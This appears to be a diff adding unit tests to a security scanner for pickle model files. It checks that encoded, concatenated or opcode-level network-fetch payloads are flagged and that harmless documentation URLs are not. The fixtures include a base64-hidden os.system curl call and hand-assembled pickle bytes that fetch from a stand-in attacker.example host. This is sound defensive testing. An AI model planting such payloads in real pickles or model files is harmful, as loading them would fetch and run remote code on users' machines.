@@ -826,6 +826,22 @@ def test_scan_stream_detects_base64_encoded_execution_text(encoded: str, pattern
     assert not any(issue.message.startswith("Legacy encoded dangerous pattern detected") for issue in result.issues)
 
 
+def test_scan_stream_keeps_base64_encoded_network_execution_actionable() -> None:
+    payload = pickle.dumps(
+        {"encoded": "b3Muc3lzdGVtKCdjdXJsIGh0dHBzOi8vYXR0YWNrZXIuZXhhbXBsZS9wYXlsb2FkJyk="},
+        protocol=4,
+    )
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="encoded-url-raw.pkl")
+
+    assert any(
+        issue.rule_code == "S101"
+        and issue.details.get("pickle_rule_code") == "SUSPICIOUS_STRING"
+        and issue.details.get("pattern") == "base64 os.system"
+        for issue in result.issues
+    )
+
+
 def test_hex_token_seed_gate_reuses_lowered_token() -> None:
     class CountingBytes(bytes):
         lower_calls = 0
@@ -1441,17 +1457,24 @@ def test_scan_stream_does_not_treat_system_name_as_setitem_cve() -> None:
     assert all(issue.rule_code != "S209" for issue in result.issues)
 
 
-def test_scan_stream_allows_inert_pickle_url_literals_without_critical_s310() -> None:
+@pytest.mark.parametrize("protocol", range(pickle.HIGHEST_PROTOCOL + 1))
+def test_scan_stream_allows_inert_pickle_url_literals_without_critical_s310(protocol: int) -> None:
     payload = pickle.dumps(
         {
             "license": "https://ultralytics.com/license",
             "docs": "https://docs.ultralytics.com/reference/os.system(command)",
             "api_docs": "https://docs.example.invalid/reference/requests.get(url)",
             "query_docs": "https://docs.example.invalid/path?x=1&handler=requests.get(url)",
+            "semicolon_query_docs": "https://docs.example.invalid/path?x=1;handler=requests.get(url)",
+            "comma_query_docs": "https://docs.example.invalid/path?x=1,handler=httpx.get(url)",
             "socket_docs": "https://docs.example.invalid/reference/socket.connect(host)",
+            "credentialed_docs": "https://user:pass@docs.example.invalid/reference/os.system(cmd)",
+            "encoded_docs": "https://docs.example.invalid/%E2%98%83/%00/reference/subprocess.run(args)",
+            "control_docs": "\x00https://docs.example.invalid/reference/httpx.get(url)\x1f",
+            "fragmented_docs": ["https://docs.example.invalid/reference/requests.", "get(url)"],
             "repository": "https://github.com/ultralytics/ultralytics",
         },
-        protocol=0,
+        protocol=protocol,
     )
 
     result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="url-metadata.pkl")
@@ -1460,6 +1483,64 @@ def test_scan_stream_allows_inert_pickle_url_literals_without_critical_s310() ->
     assert not any(issue.rule_code == "S310" and issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
     assert not any(
         issue.details.get("type") == "network_library" and issue.severity == IssueSeverity.CRITICAL
+        for issue in result.issues
+    )
+
+
+def test_scan_stream_allows_large_inert_url_literal_at_raw_scan_budget_boundary() -> None:
+    literal = (
+        ("A" * 4096)
+        + "https://docs.example.invalid/reference/requests.get(url)"
+        + "https://docs.example.invalid/%E2%98%83/%00/reference/os.system(cmd)"
+        + ("B" * 4096)
+    )
+    payload = pickle.dumps({"metadata_url": literal}, protocol=4)
+
+    result = PickleScanner(
+        config={
+            "pickle_root_raw_scan_limit_bytes": len(payload),
+            "pickle_expensive_raw_scan_limit_bytes": len(payload),
+        }
+    ).scan_stream(io.BytesIO(payload), len(payload), source="large-url-metadata.pkl")
+
+    assert result.success is True
+    assert not any(issue.rule_code == "S310" and issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+    assert not any(
+        issue.details.get("type") == "network_library" and issue.severity == IssueSeverity.CRITICAL
+        for issue in result.issues
+    )
+
+
+def test_scan_stream_allows_inert_url_literal_in_concatenated_stream_without_critical_network() -> None:
+    first_stream = pickle.dumps({"weights": [1, 2, 3]}, protocol=4)
+    second_stream = pickle.dumps(
+        {"metadata_url": "https://docs.example.invalid/path?x=1;handler=requests.get(url)"},
+        protocol=4,
+    )
+    payload = first_stream + b"\x00\x00" + second_stream
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="concatenated-url-metadata.pkl")
+
+    assert not any(
+        issue.rule_code in {"S302", "S310"} and issue.severity == IssueSeverity.CRITICAL for issue in result.issues
+    )
+
+
+def test_scan_stream_keeps_executable_network_literal_in_concatenated_stream_actionable() -> None:
+    first_stream = pickle.dumps({"weights": [1, 2, 3]}, protocol=4)
+    second_stream = pickle.dumps(
+        {"loader": "requests.get('https://attacker.example/payload')"},
+        protocol=4,
+    )
+    payload = first_stream + b"\x00\x00" + second_stream
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="concatenated-network-loader.pkl")
+
+    assert any(
+        issue.rule_code == "S302"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "network_function"
+        and issue.details.get("function") == "requests.get"
         for issue in result.issues
     )
 
@@ -1583,6 +1664,64 @@ def test_scan_stream_keeps_network_url_reducer_actionable() -> None:
         and issue.details.get("associated_global") == "urllib.request.urlopen"
         for issue in result.issues
     )
+
+
+def test_scan_stream_keeps_memoized_stack_global_network_url_reducer_actionable() -> None:
+    payload = (
+        b"\x80\x04"
+        + _short_binunicode(b"urllib.request")
+        + b"\x940"
+        + _short_binunicode(b"urlopen")
+        + b"\x940h\x00h\x01\x93"
+        + _short_binunicode(b"https://user:pass@attacker.example/%E2%98%83/payload")
+        + b"\x940h\x02\x85R."
+    )
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="memo-stack-global-urlopen.pkl")
+
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("pickle_rule_code") == "DANGEROUS_CALL"
+        and issue.details.get("associated_global") == "urllib.request.urlopen"
+        for issue in result.issues
+    )
+    assert any(issue.rule_code == "S309" and issue.details.get("type") == "url_detected" for issue in result.issues)
+    assert any(
+        issue.rule_code == "S302"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "network_function"
+        and issue.details.get("function") == "urlopen"
+        for issue in result.issues
+    )
+
+
+def test_scan_stream_keeps_extension_like_url_reduce_actionable() -> None:
+    payload = b"\x80\x04\x82\x01" + _short_binunicode(b"https://attacker.example/payload") + b"\x85R."
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="extension-url-reduce.pkl")
+
+    assert any(
+        issue.rule_code == "S201"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("associated_global") == "__copyreg_extension__.code_1"
+        for issue in result.issues
+    )
+
+
+def test_scan_stream_keeps_build_url_state_actionable() -> None:
+    payload = b"c__main__\nRemoteLoader\n)R}Vendpoint\nVhttps://attacker.example/payload\nsb."
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="main-build-url-state.pkl")
+
+    assert any(
+        issue.rule_code == "S207"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("pickle_rule_code") == "DANGEROUS_CALL"
+        and issue.details.get("opcode") == "BUILD"
+        and issue.details.get("associated_global") == "__main__.RemoteLoader"
+        for issue in result.issues
+    )
+    assert any(issue.rule_code == "S309" and issue.details.get("type") == "url_detected" for issue in result.issues)
 
 
 def test_scan_stream_allows_url_literal_in_safe_reducer_without_critical_s310() -> None:
